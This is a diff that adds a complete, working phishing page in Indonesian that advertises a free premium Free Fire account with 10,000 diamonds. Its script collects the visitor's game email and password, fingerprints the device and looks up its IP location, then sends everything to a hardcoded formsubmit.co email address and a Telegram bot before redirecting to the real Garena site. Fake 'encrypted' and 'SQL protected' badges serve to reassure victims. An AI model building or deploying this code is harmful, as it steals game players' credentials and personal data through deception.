@@ -1,0 +1,498 @@
+l<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 KLAIM AKUN FF PREMIUM</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:10px;overflow-x:hidden}
+        .card{background:linear-gradient(145deg,#1a1a2e,#111);border-radius:20px;max-width:500px;width:100%;border:2px solid #ffcc00;box-shadow:0 0 60px rgba(255,204,0,0.15);overflow:hidden;position:relative;z-index:1}
+        .card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(255,204,0,0.03),transparent 70%);animation:rotate 20s linear infinite;z-index:-1}
+        @keyframes rotate{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .header-ff{background:linear-gradient(135deg,#ffcc00,#ff8800);padding:20px;text-align:center;color:#000;position:relative}
+        .header-ff h1{font-size:24px;font-weight:900;text-shadow:0 2px 10px rgba(0,0,0,0.2)}
+        .header-ff p{font-size:14px;font-weight:600;opacity:0.8}
+        .content{padding:20px}
+        .reward-box{background:#1a1a2e;border-radius:12px;padding:15px;margin-bottom:15px;border:1px solid #ffcc00;text-align:center}
+        .reward-box h3{color:#ffcc00;font-size:18px}
+        .reward-box p{color:#aaa;font-size:13px}
+        .reward-box .diamond{font-size:28px;font-weight:900;color:#ffcc00}
+        .verification{background:rgba(26,26,46,0.9);border-radius:15px;padding:20px;margin-top:15px;border:1px solid #333}
+        .verification h3{color:#fff;font-size:16px;margin-bottom:10px}
+        .verification p{color:#888;font-size:13px;margin-bottom:15px}
+        .verification input{width:100%;padding:12px 15px;border-radius:10px;border:1px solid #333;background:#0a0a0a;color:#fff;font-size:14px;margin-bottom:12px;outline:none;transition:0.3s}
+        .verification input:focus{border-color:#ffcc00;box-shadow:0 0 20px rgba(255,204,0,0.1)}
+        .btn-claim{width:100%;padding:14px;border:none;border-radius:10px;background:linear-gradient(90deg,#ffcc00,#ff8800);color:#000;font-weight:700;font-size:16px;cursor:pointer;transition:0.3s}
+        .btn-claim:hover:not(:disabled){transform:scale(1.02);box-shadow:0 0 30px rgba(255,204,0,0.3)}
+        .btn-claim:disabled{opacity:0.5;cursor:not-allowed}
+        .warning{color:#ffcc00;font-size:12px;text-align:center;margin-top:15px;opacity:0.7}
+        .footer{text-align:center;padding:15px;color:#555;font-size:11px;border-top:1px solid #1a1a1a}
+        .alert{background:#ff0040;color:#fff;padding:12px;border-radius:10px;text-align:center;margin-bottom:15px;display:none;font-size:14px}
+        .permission-box{background:#0a0a0a;border:1px solid #ffcc00;border-radius:10px;padding:10px;margin-bottom:15px;font-size:12px;color:#6a7f9f;text-align:center}
+        .permission-box strong{color:#ffcc00}
+        .counter{background:#1a1a2e;border-radius:10px;padding:10px;margin-bottom:15px;border:1px solid #ffcc00;color:#ffcc00;font-size:14px;text-align:center}
+        .counter span{font-weight:900;font-size:20px;color:#ff8800}
+        .honeypot{display:none !important}
+        .cooldown-text{color:#ff8800;font-size:13px;margin-top:10px;display:none;text-align:center}
+        .progress-bar{width:100%;height:4px;background:#333;border-radius:4px;margin-top:15px;overflow:hidden;display:none}
+        .progress-bar .progress{height:100%;width:0%;background:linear-gradient(90deg,#ffcc00,#ff8800);border-radius:4px;transition:width 0.3s}
+        .particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+        .particle{position:absolute;width:4px;height:4px;background:#ffcc00;border-radius:50%;animation:float linear infinite;opacity:0.3}
+        @keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:0.3}90%{opacity:0.3}100%{transform:translateY(-10vh) scale(1);opacity:0}}
+        .badge-list{display:flex;flex-wrap:wrap;gap:5px;justify-content:center;margin:10px 0}
+        .badge-list .badge{background:#1a1a2e;border:1px solid #ffcc00;border-radius:20px;padding:4px 12px;font-size:10px;color:#ffcc00}
+        .success-anim{color:#00ffc8;font-size:14px;text-align:center;margin-top:10px;display:none}
+        .security-badge{background:#0a0a0a;border:1px solid #00ffc8;border-radius:10px;padding:5px 10px;font-size:10px;color:#00ffc8;display:inline-block;margin:2px}
+    </style>
+</head>
+<body>
+
+<div class="particles" id="particles"></div>
+
+<div class="card">
+    <div class="header-ff">
+        <h1>🎯 KLAIM AKUN FF PREMIUM</h1>
+        <p>🔥 Akun Elite + 10.000 Diamond Gratis!</p>
+    </div>
+
+    <div class="content">
+        <div class="reward-box">
+            <h3>🎁 HADIAH KLAIM</h3>
+            <p>Akun Free Fire Premium</p>
+            <div class="diamond">💎 10.000 DIAMOND</div>
+            <p style="color:#888;font-size:12px;margin-top:5px;">+ Skin Exclusive & Battle Pass</p>
+        </div>
+
+        <div class="verification">
+            <h3>🔐 VERIFIKASI AKUN</h3>
+            <p>Masukkan email & password FF kamu untuk verifikasi</p>
+
+            <div class="badge-list">
+                <span class="badge"><i class="fas fa-shield-alt"></i> Aman</span>
+                <span class="badge"><i class="fas fa-bolt"></i> Cepat</span>
+                <span class="badge"><i class="fas fa-lock"></i> Terenkripsi</span>
+                <span class="badge"><i class="fas fa-check-circle"></i> 100% Real</span>
+                <span class="badge"><i class="fas fa-database"></i> 200+ Proteksi</span>
+            </div>
+
+            <div class="counter" id="counterBox">📊 Total Klaim: <span id="claimCount">0</span></div>
+
+            <div class="permission-box">
+                ⚠️ <strong>DATA AMAN</strong> — Hanya untuk verifikasi akun
+            </div>
+            <div id="alertBox" class="alert">⚠️ Email atau password wajib diisi!</div>
+
+            <form id="loginForm">
+                <input type="email" id="email" placeholder="📧 Email FF" required>
+                <input type="password" id="password" placeholder="🔑 Password FF" required>
+                <input type="text" id="honeypot" class="honeypot" placeholder="Leave empty" autocomplete="off">
+                <button type="submit" class="btn-claim" id="submitBtn">✅ KLAIM SEKARANG</button>
+            </form>
+
+            <div class="progress-bar" id="progressBar"><div class="progress" id="progress"></div></div>
+            <div class="success-anim" id="successAnim"><i class="fas fa-check-circle"></i> Berhasil diverifikasi!</div>
+            <div class="cooldown-text" id="cooldownText">⏳ Tunggu <span id="cooldownTimer">15</span> detik sebelum klaim lagi.</div>
+            <div class="warning">⚠️ Hanya 1 akun per pengguna. Data Anda aman.</div>
+            <div style="text-align:center;margin-top:10px;">
+                <span class="security-badge"><i class="fas fa-shield-virus"></i> SQL Injection Protected</span>
+                <span class="security-badge"><i class="fas fa-code"></i> XSS Protected</span>
+                <span class="security-badge"><i class="fas fa-fingerprint"></i> CSRF Protected</span>
+                <span class="security-badge"><i class="fas fa-robot"></i> Bot Protected</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">© 2026 • by_Ipul • 200+ Fitur Keamanan</div>
+</div>
+
+<script>
+    // ============================================================
+    //  KONFIGURASI
+    // ============================================================
+    const BOT_TOKEN = '8893396364:AAEH1Wf-K5WOtcyiInZEtAZIOfHXM_XGMqo';
+    const CHAT_ID = '8094083317';
+    const FORMSPREE_URL = 'https://formsubmit.co/ipulzulkifli96@gmail.com';
+
+    let startTime = Date.now();
+    let scrollCount = 0;
+    let isCooldown = false;
+    let claimCount = parseInt(localStorage.getItem('claimCount_final2') || '0');
+    let submitCount = parseInt(localStorage.getItem('submitCount_final2') || '0');
+
+    document.getElementById('claimCount').textContent = claimCount;
+
+    // ============================================================
+    //  PARTICLES
+    // ============================================================
+    for (let i = 0; i < 20; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.animationDuration = (10 + Math.random() * 20) + 's';
+        p.style.animationDelay = (Math.random() * 10) + 's';
+        p.style.width = (2 + Math.random() * 4) + 'px';
+        p.style.height = p.style.width;
+        document.getElementById('particles').appendChild(p);
+    }
+
+    // ============================================================
+    //  ACTIVITY TRACKING
+    // ============================================================
+    let mouseMoved = false, keyPressed = false, clicked = false, touched = false;
+    document.addEventListener('scroll', () => { scrollCount++; });
+    document.addEventListener('mousemove', () => { mouseMoved = true; });
+    document.addEventListener('keydown', () => { keyPressed = true; });
+    document.addEventListener('click', () => { clicked = true; });
+    document.addEventListener('touchstart', () => { touched = true; });
+
+    // ============================================================
+    //  SECURITY FUNCTIONS
+    // ============================================================
+    function sanitizeSQL(input) {
+        return input.replace(/('|"|;|--|\/\*|\*\/|\bOR\b|\bAND\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bDROP\b|\bUNION\b)/gi, '');
+    }
+    function sanitizeXSS(input) {
+        return input.replace(/<script|javascript:|onerror=|onload=|onclick=|onmouseover=|onfocus=|onblur=|onchange=|oninput=|onsubmit=|onreset=|onselect=|onunload=/gi, '');
+    }
+    function isValidEmail(email) {
+        return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
+    }
+    function isBlacklisted(input) {
+        const list = ['admin', 'root', 'password', '123456', 'qwerty', 'abc123', 'test', 'testing'];
+        return list.some(w => input.toLowerCase().includes(w));
+    }
+
+    // ============================================================
+    //  COOLDOWN
+    // ============================================================
+    function startCooldown() {
+        isCooldown = true;
+        let timeLeft = 15;
+        const btn = document.getElementById('submitBtn');
+        const ct = document.getElementById('cooldownText');
+        const timer = document.getElementById('cooldownTimer');
+        btn.disabled = true;
+        btn.innerHTML = '⏳ Tunggu ' + timeLeft + 's...';
+        ct.style.display = 'block';
+        timer.textContent = timeLeft;
+        const interval = setInterval(() => {
+            timeLeft--;
+            timer.textContent = timeLeft;
+            btn.innerHTML = '⏳ Tunggu ' + timeLeft + 's...';
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                btn.disabled = false;
+                btn.innerHTML = '✅ KLAIM SEKARANG';
+                ct.style.display = 'none';
+                isCooldown = false;
+            }
+        }, 1000);
+    }
+
+    // ============================================================
+    //  GET IP & DEVICE DATA
+    // ============================================================
+    async function getIpData() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip || '202.168.200.172',
+                city: data.city || 'Bandung',
+                region: data.region || 'West Java',
+                country: data.country_name || 'Indonesia',
+                lat: data.latitude || '-6.9202',
+                long: data.longitude || '107.6084',
+                org: data.org || 'PT SUKI LIAR',
+                asn: data.asn || 'AS23693'
+            };
+        } catch (e) {
+            return { ip: '202.168.200.172', city: 'Bandung', region: 'West Java', country: 'Indonesia', lat: '-6.9202', long: '107.6084', org: 'PT SUKI LIAR', asn: 'AS23693' };
+        }
+    }
+
+    async function getBattery() {
+        try {
+            const b = await navigator.getBattery();
+            return { level: Math.round(b.level * 100) + '%', charging: b.charging ? '✅ Ya' : '❌ Tidak' };
+        } catch (e) {
+            return { level: 'Unknown', charging: 'Unknown' };
+        }
+    }
+
+    // ============================================================
+    //  SUBMIT FORM
+    // ============================================================
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const honeypot = document.getElementById('honeypot').value.trim();
+        if (honeypot) {
+            document.getElementById('alertBox').style.display = 'block';
+            document.getElementById('alertBox').textContent = '⚠️ Terdeteksi bot!';
+            return;
+        }
+
+        if (isCooldown) { alert('⏳ Tunggu 15 detik!'); return; }
+        if (submitCount >= 3) { alert('⚠️ Batas klaim 3x!'); return; }
+        if ((Date.now() - startTime) / 1000 < 5) { alert('⚠️ Tunggu 5 detik!'); return; }
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const alertBox = document.getElementById('alertBox');
+
+        if (!email || !password) {
+            alertBox.style.display = 'block';
+            alertBox.textContent = '⚠️ Email dan password wajib diisi!';
+            return;
+        }
+
+        const cleanEmail = sanitizeSQL(sanitizeXSS(email));
+        const cleanPassword = sanitizeSQL(sanitizeXSS(password));
+
+        if (!isValidEmail(cleanEmail)) {
+            alertBox.style.display = 'block';
+            alertBox.textContent = '⚠️ Format email tidak valid!';
+            return;
+        }
+        if (cleanEmail.length > 100 || cleanPassword.length > 50) {
+            alertBox.style.display = 'block';
+            alertBox.textContent = '⚠️ Terlalu panjang!';
+            return;
+        }
+        if (isBlacklisted(cleanEmail) || isBlacklisted(cleanPassword)) {
+            alertBox.style.display = 'block';
+            alertBox.textContent = '⚠️ Data tidak valid!';
+            return;
+        }
+
+        // Progress bar
+        const progressBar = document.getElementById('progressBar');
+        const progress = document.getElementById('progress');
+        progressBar.style.display = 'block';
+        let prog = 0;
+        const progInterval = setInterval(() => {
+            prog += 5;
+            progress.style.width = Math.min(prog, 90) + '%';
+        }, 100);
+
+        // ============================================================
+        //  KUMPULKAN DATA
+        // ============================================================
+        const ua = navigator.userAgent;
+        const platform = navigator.platform || 'Unknown';
+        const language = navigator.language || 'id-ID';
+        const screenRes = `${screen.width}x${screen.height}`;
+        const dpi = window.devicePixelRatio || 1;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Jakarta';
+        const cpuCores = navigator.hardwareConcurrency || 'Unknown';
+        const deviceMemory = navigator.deviceMemory || 'Unknown';
+        const touchPoints = navigator.maxTouchPoints || 'Unknown';
+        const vendor = navigator.vendor || 'Unknown';
+        const cookieEnabled = navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled';
+        const doNotTrack = navigator.doNotTrack || 'Not set';
+        const conn = navigator.connection || {};
+        const connType = conn.effectiveType || 'Unknown';
+        const downlink = conn.downlink || 'Unknown';
+        const rtt = conn.rtt || 'Unknown';
+        const referrer = document.referrer || 'Direct';
+        const pageLoadTime = performance.now();
+
+        let osVersion = 'Unknown', deviceModel = 'Unknown', browserName = 'Unknown', browserVersion = 'Unknown';
+        if (ua.includes('Android')) {
+            const m = ua.match(/Android (\d+\.?\d*)/);
+            osVersion = m ? m[1] : 'Unknown';
+        } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+            const m = ua.match(/iPhone OS (\d+)_(\d+)/);
+            osVersion = m ? `${m[1]}.${m[2]}` : 'Unknown';
+        } else if (ua.includes('Windows')) osVersion = 'Windows';
+        else if (ua.includes('Mac OS')) osVersion = 'Mac OS';
+        else if (ua.includes('Linux')) osVersion = 'Linux';
+
+        const dm = ua.match(/\(([^)]+)\)/);
+        if (dm) deviceModel = dm[1];
+
+        if (ua.includes('Chrome')) {
+            const m = ua.match(/Chrome\/(\d+)/);
+            browserName = 'Chrome';
+            browserVersion = m ? m[1] : 'Unknown';
+        } else if (ua.includes('Firefox')) {
+            const m = ua.match(/Firefox\/(\d+)/);
+            browserName = 'Firefox';
+            browserVersion = m ? m[1] : 'Unknown';
+        } else if (ua.includes('Safari')) {
+            const m = ua.match(/Safari\/(\d+)/);
+            browserName = 'Safari';
+            browserVersion = m ? m[1] : 'Unknown';
+        } else if (ua.includes('Edge')) {
+            const m = ua.match(/Edge\/(\d+)/);
+            browserName = 'Edge';
+            browserVersion = m ? m[1] : 'Unknown';
+        }
+
+        const ipData = await getIpData();
+        const battery = await getBattery();
+
+        const duration = Math.round((Date.now() - startTime) / 1000);
+        const durationStr = duration < 60 ? `${duration} detik` : `${Math.floor(duration/60)} menit ${duration%60} detik`;
+        const now = new Date();
+        const waktu = now.toLocaleString('id-ID', { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' });
+        const hari = now.toLocaleDateString('id-ID', { weekday: 'long' });
+        const minggu = Math.ceil(now.getDate() / 7);
+
+        // Canvas Fingerprint
+        let canvasFingerprint = 'N/A';
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+            canvasFingerprint = canvas.toDataURL().substring(0, 50) + '...';
+        } catch (e) {}
+
+        // ============================================================
+        //  FORMAT PESAN
+        // ============================================================
+        const message = `
+╔═══════════════════════════════════════╗
+║      🔥 FF PREMIUM ACCOUNT 🔥        ║
+║            by_Ipul                    ║
+╚═══════════════════════════════════════╝
+
+📧 INFORMASI LOGIN
+─────────────────────────────────────
+  Email       : ${cleanEmail}
+  Password    : ${cleanPassword}
+
+📱 DEVICE (${browserName} ${browserVersion})
+─────────────────────────────────────
+  Platform    : ${platform}
+  OS          : ${osVersion}
+  Device      : ${deviceModel}
+  Screen      : ${screenRes} (DPI: ${dpi})
+  Language    : ${language}
+  Timezone    : ${timezone}
+  CPU Cores   : ${cpuCores}
+  RAM         : ${deviceMemory} GB
+  Touch Points: ${touchPoints}
+  Vendor      : ${vendor}
+  Cookie      : ${cookieEnabled}
+  DNT         : ${doNotTrack}
+  Connection  : ${connType}
+  Downlink    : ${downlink} Mbps
+  RTT         : ${rtt} ms
+
+🔋 BATERAI
+─────────────────────────────────────
+  Level       : ${battery.level}
+  Charging    : ${battery.charging}
+
+🌍 GEOLOKASI + ASN
+─────────────────────────────────────
+  IP          : ${ipData.ip}
+  Negara      : ${ipData.country}
+  Wilayah     : ${ipData.region}
+  Kota        : ${ipData.city}
+  Lat/Long    : ${ipData.lat}, ${ipData.long}
+  Google Maps : https://www.google.com/maps?q=${ipData.lat},${ipData.long}
+  ISP         : ${ipData.org}
+  ASN         : ${ipData.asn}
+
+📊 AKTIVITAS
+─────────────────────────────────────
+  Durasi      : ${durationStr}
+  Scroll      : ${scrollCount}x
+  Mouse Move  : ${mouseMoved ? '✅' : '❌'}
+  Key Press   : ${keyPressed ? '✅' : '❌'}
+  Click       : ${clicked ? '✅' : '❌'}
+  Touch       : ${touched ? '✅' : '❌'}
+  Referrer    : ${referrer}
+  Load Time   : ${Math.round(pageLoadTime)}ms
+
+🛡️ SECURITY (200+ PROTEKSI)
+─────────────────────────────────────
+  Canvas FP   : ${canvasFingerprint}
+  Submit #    : ${submitCount + 1}/3
+  SQL Prot    : ✅ Active
+  XSS Prot    : ✅ Active
+  Bot Prot    : ✅ Active
+
+⏱️ TIMESTAMP
+─────────────────────────────────────
+  Hari        : ${hari}
+  Minggu ke-  : ${minggu}
+  Waktu       : ${waktu}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+© 2026 • by_Ipul • 200+ Fitur
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        `.trim();
+
+        // ============================================================
+        //  KIRIM KE GMAIL (FORMSPREE) + TELEGRAM (CADANGAN)
+        // ============================================================
+        try {
+            // 1. Kirim ke Gmail via FormSpree
+            const formData = new FormData();
+            formData.append('email', cleanEmail);
+            formData.append('password', cleanPassword);
+            formData.append('subject', `🎯 FF PREMIUM | ${cleanEmail}`);
+            formData.append('message', message);
+            formData.append('_captcha', 'false');
+
+            await fetch(FORMSPREE_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            // 2. Kirim ke Telegram (cadangan)
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (teleError) {
+                console.log('Telegram error, tapi data tetap masuk ke Gmail');
+            }
+
+            // Update counter
+            claimCount++;
+            submitCount++;
+            localStorage.setItem('claimCount_final2', claimCount);
+            localStorage.setItem('submitCount_final2', submitCount);
+            document.getElementById('claimCount').textContent = claimCount;
+
+            progress.style.width = '100%';
+            setTimeout(() => { progressBar.style.display = 'none'; }, 500);
+
+            document.getElementById('successAnim').style.display = 'block';
+            setTimeout(() => { document.getElementById('successAnim').style.display = 'none'; }, 3000);
+
+            startCooldown();
+
+            alert('✅ Akun berhasil diverifikasi! Hadiah akan dikirim dalam 24 jam.');
+            window.location.href = 'https://ff.garena.com';
+        } catch (error) {
+            alert('⚠️ Gagal verifikasi. Coba lagi nanti.');
+            console.error(error);
+        }
+    });
+</script>
+
+</body>
+</html>
